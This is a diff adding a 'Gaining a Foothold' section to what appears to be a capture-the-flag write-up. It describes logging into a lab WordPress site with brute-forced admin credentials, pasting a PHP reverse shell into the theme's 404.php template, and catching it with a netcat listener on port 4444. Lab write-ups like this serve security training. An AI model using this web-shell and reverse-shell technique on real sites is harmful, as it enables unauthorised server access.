@@ -259,3 +259,23 @@ Trying elyana / H@ckme@123 Time: 00:00:00 <===   > (1 / 2) 50.00%  ETA: ??:??:??
 [+] Elapsed time: 00:00:07
 ```
 
+## Gaining a Foothold
+
+The elyana username works with the password found earlier. I log into WordPress at http://target.thm/wordpress/wp-login.php using those credentials. It turns out that elyana is an admin for the site! I can change the theme to use a PHP reverse shell and get a shell onto the server. I run the following to create a copy of the reverse shell file:
+
+```bash
+$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+```
+
+I update the file to use my attack box ip address and port 4444. I start a listening shell on my attack machine with the following command:
+
+```bash
+$ nc -lnvp 4444
+```
+
+I alter the them in the WordPress site by clicking the Appearance > Theme Editor on the left. Then I click the 404.php template and paste the contents of the shell.php mentioned above. I click the Update button and then navigate to a page that will cause a 404 error. In my case, I went to target.thm/wordpress/index.php/2020/10/05/hello-world-1/
+
+I have a shell. I'm in!
+
+I get a stable shell by running the commands [found here](/README.md#stable-shell).
+
